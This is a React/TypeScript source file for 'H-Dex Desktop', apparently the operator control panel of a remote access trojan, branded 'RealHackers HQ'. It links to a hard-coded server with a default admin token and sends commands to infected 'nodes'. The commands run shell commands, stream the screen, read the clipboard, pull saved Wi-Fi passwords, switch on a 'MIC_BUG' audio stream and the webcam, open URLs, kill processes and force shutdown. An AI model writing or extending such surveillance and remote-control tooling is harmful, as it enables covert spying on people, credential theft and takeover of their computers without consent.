import React, { useState, useEffect, useCallback, useRef } from 'react';
import { 
  Monitor, Terminal, 
  ShieldCheck, Database, 
  Eye, Lock,
  RefreshCcw,
  MessageSquare, Info,
  Camera, Link as LinkIcon, Activity,
  Clipboard, Power, Settings, Wifi, List, Mic, Trash2
} from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import { toast } from 'sonner';

// --- TYPES ---

interface PCNode {
  id: string;
  name: string;
  ip: string;
  os: string;
  status: string;
  last_seen: string;
  tag?: string;
  is_active: number;
}

interface LogEntry {
  id: string;
  text: string;
  type: 'info' | 'error' | 'success' | 'cmd' | 'result' | 'event' | 'debug';
  time: string;
  data?: any;
}

interface ProcessNode {
    pid: number;
    name: string;
    username: string;
}

const HDexPage: React.FC = () => {
  const [nodes, setNodes] = useState<PCNode[]>([]);
  const [selectedNode, setSelectedNode] = useState<PCNode | null>(null);
  const [activeTab, setActiveTab] = useState<'SYSTEM' | 'TELEMETRY' | 'PROCESSES' | 'INTEL' | 'LOGS' | 'DEBUG'>('SYSTEM');
  const [searchQuery, setSearchQuery] = useState('');
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [lastSct, setLastSct] = useState<string | null>(null);
  const [lastCam, setLastCam] = useState<string | null>(null);
  const [processes, setProcesses] = useState<ProcessNode[]>([]);
  const [wsConnected, setWsConnected] = useState(false);

  // Command Input State
  const [inputModal, setInputModal] = useState<{ open: boolean, command: string, label: string, placeholder: string } | null>(null);
  const [inputValue, setInputValue] = useState('');

  // Settings
  const [showSettings, setShowSettings] = useState(false);
  const [hdexUrl, setHdexUrl] = useState(localStorage.getItem('hdex_url') || 'https://talhasss-hdex-ultra-server.hf.space');
  const [hdexToken, setHdexToken] = useState(localStorage.getItem('hdex_token') || 'hdex_admin_2026');

  const accentColor = '#3498db'; // PC Blue Accent
  const wsRef = useRef<WebSocket | null>(null);

  const addLog = useCallback((text: string, type: LogEntry['type'] = 'info', data?: any) => {
    const newLog: LogEntry = {
      id: Math.random().toString(36).substr(2, 9),
      text: text || "EMPTY_RESPONSE",
      type,
      time: new Date().toLocaleTimeString([], { hour12: false }),
      data
    };
    setLogs(prev => [newLog, ...prev].slice(0, 100));
  }, []);

  const connectWS = useCallback(() => {
    if (wsRef.current) {
        wsRef.current.onclose = null;
        wsRef.current.close();
    }
    
    const wsHost = hdexUrl.replace('https://', 'wss://').replace('http://', 'ws://');
    const ws = new WebSocket(`${wsHost}/ws`);
    wsRef.current = ws;

    ws.onopen = () => {
      ws.send(JSON.stringify({ type: 'register_dashboard', token: hdexToken }));
    };

    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.type === 'auth_success') {
          setWsConnected(true);
          addLog("Uplink established with Ultra Server", "success");
        } else if (data.type === 'device_list') {
          setNodes(data.devices || []);
        } else if (data.type === 'screen_frame') {
          setLastSct(`data:image/jpeg;base64,${data.data}`);
          addLog("Visual intel frame updated", "event");
        } else if (data.type === 'webcam_frame') {
            setLastCam(`data:image/jpeg;base64,${data.data}`);
            addLog("Webcam stream frame received", "event");
        } else if (data.type === 'process_list') {
            setProcesses(data.data || []);
            addLog(`Retrieved ${data.data?.length || 0} active processes`, "success");
        } else if (data.type === 'command_output') {
          addLog(data.output, "result", data);
        } else if (data.type === 'clipboard_content') {
           addLog(`CLIPBOARD: ${data.data}`, "result", data);
        }
      } catch (err) {
        console.error("WS Parse Error:", err);
      }
    };

    ws.onclose = () => setWsConnected(false);
  }, [hdexUrl, hdexToken, addLog]);

  useEffect(() => {
    document.title = "RealHackers HQ // H-Dex Desktop";
    connectWS();
    const hb = setInterval(() => {
       if (wsRef.current?.readyState === WebSocket.OPEN) {
         wsRef.current.send(JSON.stringify({ type: 'heartbeat' }));
       }
    }, 20000);
    return () => {
        clearInterval(hb);
        if (wsRef.current) wsRef.current.close();
    };
  }, [connectWS]);

  const sendCommand = async (type: string, data: any = {}) => {
    if (!selectedNode || !wsConnected || wsRef.current?.readyState !== WebSocket.OPEN) {
      toast.error("Action restricted: Check Uplink.");
      return;
    }
    const cmd = { type, target_id: selectedNode.id, ...data };
    wsRef.current.send(JSON.stringify(cmd));
    addLog(`SIGNAL_DISPATCH: ${type.toUpperCase()}`, 'cmd');
  };

  const submitCommandInput = () => {
    if (inputModal) {
      if (inputModal.command === 'execute_command') sendCommand('execute_command', { command: inputValue });
      else if (inputModal.command === 'show_message') sendCommand('show_message', { title: "HQ_ALERT", message: inputValue, icon: 64 });
      else if (inputModal.command === 'open_url') sendCommand('open_url', { url: inputValue });
      setInputModal(null);
    }
  };

  const filteredNodes = nodes.filter(n => 
    n.id.toLowerCase().includes(searchQuery.toLowerCase()) || 
    n.name?.toLowerCase().includes(searchQuery.toLowerCase())
  );

  return (
    <div className="container" style={{ maxWidth: '1800px', padding: '1rem' }}>
       
       <AnimatePresence>
        {inputModal && (
          <div style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.9)', zIndex: 3000, display: 'flex', alignItems: 'center', justifyContent: 'center', backdropFilter: 'blur(10px)' }}>
            <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }} className="card" style={{ width: '450px', padding: '2.5rem', border: `1px solid ${accentColor}` }}>
              <h3>{inputModal.label}</h3>
              <input 
                autoFocus type="text" value={inputValue} onChange={e => setInputValue(e.target.value)} 
                placeholder={inputModal.placeholder}
                style={{ width: '100%', padding: '1.2rem', background: '#000', border: '1px solid #333', color: '#fff', fontSize: '1rem' }}
                onKeyDown={e => e.key === 'Enter' && submitCommandInput()}
              />
              <div style={{ display: 'flex', gap: '1rem', marginTop: '2rem' }}>
                <button onClick={submitCommandInput} className="btn" style={{ flex: 1, borderColor: accentColor }}>SEND</button>
                <button onClick={() => setInputModal(null)} className="btn" style={{ background: '#222' }}>CANCEL</button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {showSettings && (
         <div style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.9)', zIndex: 3000, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <div className="card" style={{ width: '500px', padding: '2rem', border: '1px solid #fff' }}>
               <SectionTitle icon={Settings} label="H-DEX_UPLINK_CONFIG" color={accentColor} />
               <input type="text" value={hdexUrl} onChange={e => setHdexUrl(e.target.value)} placeholder="H-DEX_SERVER_URL" style={{ width: '100%', padding: '1rem', background: '#000', border: '1px solid #222', color: '#fff', marginBottom: '1rem' }} />
               <input type="password" value={hdexToken} onChange={e => setHdexToken(e.target.value)} placeholder="ADMIN_TOKEN" style={{ width: '100%', padding: '1rem', background: '#000', border: '1px solid #222', color: '#fff', marginBottom: '2rem' }} />
               <button onClick={() => { localStorage.setItem('hdex_url', hdexUrl); localStorage.setItem('hdex_token', hdexToken); setShowSettings(false); connectWS(); }} className="btn" style={{ width: '100%', borderColor: accentColor }}>SAVE_AND_LINK</button>
            </div>
         </div>
      )}

       <header style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.5rem', background: 'rgba(52, 152, 219, 0.05)', padding: '1.2rem', border: '1px solid #1a3a5a' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '1.5rem' }}>
          <ShieldCheck size={28} color={accentColor} />
          <h1 style={{ fontSize: '1.4rem', fontWeight: '900', letterSpacing: '4px' }}>H-DEX // DESKTOP_GRID</h1>
          <div style={{ display: 'flex', gap: '2rem', fontSize: '0.7rem', color: '#555', fontFamily: 'monospace' }}>
             <div>NODES: <span style={{ color: '#fff' }}>{nodes.length}</span></div>
             <div>UPLINK: <span style={{ color: wsConnected ? '#2ecc71' : '#e74c3c' }}>{wsConnected ? 'SECURE' : 'OFFLINE'}</span></div>
          </div>
        </div>
        <div style={{ display: 'flex', gap: '1rem' }}>
           <button className="btn" onClick={() => setShowSettings(true)} style={{ padding: '0.6rem', borderColor: '#1a3a5a' }}><Settings size={18} /></button>
           <button className="btn" onClick={() => connectWS()} style={{ padding: '0.6rem', borderColor: '#1a3a5a' }}><RefreshCcw size={18} /></button>
        </div>
      </header>

      <div style={{ display: 'grid', gridTemplateColumns: '380px 1fr 400px', gap: '1.5rem', height: 'calc(100vh - 120px)' }}>
        
        {/* LEFT: NODE SELECTOR */}
        <div className="card" style={{ padding: '1.5rem', display: 'flex', flexDirection: 'column', border: '1px solid #1a3a5a' }}>
           <SectionTitle icon={Database} label="REMOTE_NODES" color={accentColor} />
           <input 
             type="text" placeholder="FILTER_NODES..." value={searchQuery}
             onChange={e => setSearchQuery(e.target.value)}
             style={{ background: '#000', border: '1px solid #1a3a5a', padding: '0.8rem 1rem', fontSize: '0.75rem', color: '#fff', width: '100%', marginBottom: '1.5rem' }}
           />
          <div style={{ flex: 1, overflowY: 'auto' }}>
             {filteredNodes.map(node => (
               <div key={node.id} onClick={() => setSelectedNode(node)} style={{ padding: '1.2rem', border: '1px solid #1a3a5a', marginBottom: '1rem', cursor: 'pointer', background: selectedNode?.id === node.id ? 'rgba(52, 152, 219, 0.15)' : 'transparent', borderLeft: selectedNode?.id === node.id ? `4px solid ${accentColor}` : '1px solid #1a3a5a' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}>
                     <div style={{ fontSize: '0.9rem', fontWeight: '900' }}>{node.name}</div>
                     <div style={{ fontSize: '0.6rem', color: '#2ecc71' }}>● ONLINE</div>
                  </div>
                  <div style={{ fontSize: '0.55rem', color: '#444' }}>{node.id}</div>
                  <div style={{ marginTop: '10px', fontSize: '0.6rem', color: '#888' }}>{node.os?.toUpperCase()}</div>
               </div>
             ))}
          </div>
        </div>

        {/* MIDDLE: OPERATIONS */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '1.5rem', overflow: 'hidden' }}>
           {selectedNode ? (
             <>
                <div style={{ display: 'flex', gap: '5px', background: '#0a0a0a', padding: '5px', borderRadius: '4px' }}>
                  {['SYSTEM', 'PROCESSES', 'INTEL', 'LOGS'].map((tab: any) => (
                    <button key={tab} onClick={() => setActiveTab(tab)} className={`tab-btn ${activeTab === tab ? 'active' : ''}`} style={{ color: activeTab === tab ? accentColor : '#444', borderBottomColor: activeTab === tab ? accentColor : 'transparent', flex: 1 }}>{tab}</button>
                  ))}
                </div>

                <div style={{ flex: 1, overflowY: 'auto', padding: '0.5rem' }}>
                   <AnimatePresence mode="wait">
                      {activeTab === 'SYSTEM' && (
                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} key="sys" style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(130px, 1fr))', gap: '1rem' }}>
                           <ModuleButton icon={Info} label="SYS_INFO" onClick={() => sendCommand('get_sys_info')} color={accentColor} />
                           <ModuleButton icon={Terminal} label="SHELL" onClick={() => setInputModal({ open: true, command: 'execute_command', label: 'EXECUTE_SHELL', placeholder: 'dir, whoami, etc.' })} color={accentColor} />
                           <ModuleButton icon={Camera} label="SCREENSHOT" onClick={() => sendCommand('take_screenshot')} color={accentColor} />
                           <ModuleButton icon={Clipboard} label="CLIPBOARD" onClick={() => sendCommand('get_clipboard')} color={accentColor} />
                           <ModuleButton icon={MessageSquare} label="MESSAGE" onClick={() => setInputModal({ open: true, command: 'show_message', label: 'USER_ALERT', placeholder: 'Enter alert text...' })} color={accentColor} />
                           <ModuleButton icon={LinkIcon} label="OPEN_URL" onClick={() => setInputModal({ open: true, command: 'open_url', label: 'REMOTE_NAV', placeholder: 'https://...' })} color={accentColor} />
                           <ModuleButton icon={Wifi} label="RECOVER_WIFI" onClick={() => sendCommand('get_wifi')} color={accentColor} />
                           <ModuleButton icon={Mic} label="MIC_BUG" onClick={() => sendCommand('start_audio_stream')} color={accentColor} />
                           <ModuleButton icon={Lock} label="LOCK_PC" onClick={() => sendCommand('execute_command', { command: 'rundll32.exe user32.dll,LockWorkStation' })} danger />
                           <ModuleButton icon={Power} label="SHUTDOWN" onClick={() => sendCommand('execute_command', { command: 'shutdown /s /t 0' })} danger />
                        </motion.div>
                      )}
                      
                      {activeTab === 'PROCESSES' && (
                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} key="proc">
                           <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '1rem' }}>
                              <SectionTitle icon={List} label="ACTIVE_PROCESSES" color={accentColor} />
                              <button onClick={() => sendCommand('get_processes')} className="btn" style={{ fontSize: '0.6rem' }}>REFRESH_LIST</button>
                           </div>
                           <div style={{ background: '#050505', border: '1px solid #111', borderRadius: '4px', overflow: 'hidden' }}>
                              <table style={{ width: '100%', fontSize: '0.7rem', borderCollapse: 'collapse' }}>
                                 <thead style={{ background: '#111', color: '#666' }}>
                                    <tr><th style={{ padding: '10px', textAlign: 'left' }}>PID</th><th style={{ textAlign: 'left' }}>NAME</th><th style={{ textAlign: 'right', paddingRight: '10px' }}>ACTION</th></tr>
                                 </thead>
                                 <tbody>
                                    {processes.map(p => (
                                       <tr key={p.pid} style={{ borderBottom: '1px solid #080808' }}>
                                          <td style={{ padding: '8px 10px', color: '#888' }}>{p.pid}</td>
                                          <td style={{ fontWeight: 'bold' }}>{p.name}</td>
                                          <td style={{ textAlign: 'right', paddingRight: '10px' }}><button onClick={() => sendCommand('kill_process', { pid: p.pid })} style={{ color: '#e74c3c', background: 'none', border: 'none', cursor: 'pointer' }}><Trash2 size={12} /></button></td>
                                       </tr>
                                    ))}
                                 </tbody>
                              </table>
                           </div>
                        </motion.div>
                      )}

                      {activeTab === 'INTEL' && (
                         <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem' }}>
                            <div className="card" style={{ padding: '1rem', borderStyle: 'dashed' }}>
                               <SectionTitle icon={Eye} label="CAM_PREVIEW" color={accentColor} />
                               <div style={{ height: '200px', background: '#000', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                                  {lastCam ? <img src={lastCam} style={{ width: '100%', height: '100%', objectFit: 'cover' }} /> : <Eye size={32} opacity={0.1} />}
                               </div>
                               <button onClick={() => sendCommand('start_webcam_stream')} className="btn" style={{ width: '100%', marginTop: '1rem', borderColor: accentColor }}>SNAP_WEBCAM</button>
                            </div>
                            <div className="card" style={{ padding: '1rem', borderStyle: 'dashed' }}>
                               <SectionTitle icon={Mic} label="AUDIO_PREVIEW" color={accentColor} />
                               <div style={{ height: '200px', background: '#000', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                                  <Activity size={32} color={accentColor} className="pulse" />
                               </div>
                               <button onClick={() => sendCommand('start_audio_stream')} className="btn" style={{ width: '100%', marginTop: '1rem' }}>LISTEN_LIVE</button>
                            </div>
                         </div>
                      )}
                   </AnimatePresence>
                </div>
             </>
           ) : (
             <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column', opacity: 0.05 }}>
                <Monitor size={150} color={accentColor} />
                <h2 style={{ marginTop: '2rem', letterSpacing: '15px' }}>GRID_OFFLINE</h2>
             </div>
           )}
        </div>

        {/* RIGHT: VISUAL INTEL & LOGS */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '1.5rem' }}>
           <div className="card" style={{ flex: 1, border: '1px solid #1a3a5a', overflow: 'hidden' }}>
              <SectionTitle icon={Monitor} label="SCREEN_STREAM" color={accentColor} />
              {lastSct ? <img src={lastSct} style={{ width: '100%', height: 'calc(100% - 40px)', objectFit: 'contain' }} /> : <div style={{ height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', opacity: 0.1 }}><Camera size={64} /></div>}
           </div>
           <div className="card" style={{ height: '350px', border: '1px solid #1a3a5a', display: 'flex', flexDirection: 'column', padding: '1rem' }}>
              <SectionTitle icon={Terminal} label="CORE_LOGS" color={accentColor} />
              <div style={{ flex: 1, overflowY: 'auto', fontFamily: 'monospace', fontSize: '0.65rem' }}>
                 {logs.map(log => (
                    <div key={log.id} style={{ marginBottom: '5px' }}>
                       <span style={{ opacity: 0.3 }}>[{log.time}]</span> 
                       <span style={{ marginLeft: '10px', color: log.type === 'error' ? '#f55' : log.type === 'success' ? '#2ecc71' : (log.type === 'result' ? '#fff' : '#444') }}>{log.text.toUpperCase()}</span>
                    </div>
                 ))}
              </div>
           </div>
        </div>
      </div>
    </div>
  );
};

const SectionTitle: React.FC<{ icon: any, label: string, color?: string }> = ({ icon: Icon, label, color }) => (
   <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem', marginBottom: '1.2rem', borderBottom: '1px solid #1a3a5a', paddingBottom: '0.6rem' }}>
     <Icon size={18} color={color || 'var(--accent-color)'} opacity={0.6} />
     <span style={{ fontWeight: '800', fontSize: '0.8rem', letterSpacing: '2px', color: '#fff' }}>{label}</span>
   </div>
 );

const ModuleButton: React.FC<{ icon: any, label: string, onClick: () => void, disabled?: boolean, danger?: boolean, color?: string }> = ({ icon: Icon, label, onClick, disabled, danger, color }) => (
   <motion.button whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }} onClick={onClick} disabled={disabled} className="btn" style={{ flexDirection: 'column', height: '90px', gap: '0.5rem', width: '100%', border: danger ? '1px solid rgba(231, 76, 60, 0.3)' : '1px solid rgba(255,255,255,0.05)', color: danger ? '#e74c3c' : (color || '#fff'), fontSize: '0.55rem' }}>
     <Icon size={18} />
     <span style={{ fontWeight: 'bold' }}>{label}</span>
   </motion.button>
 );

export default HDexPage;
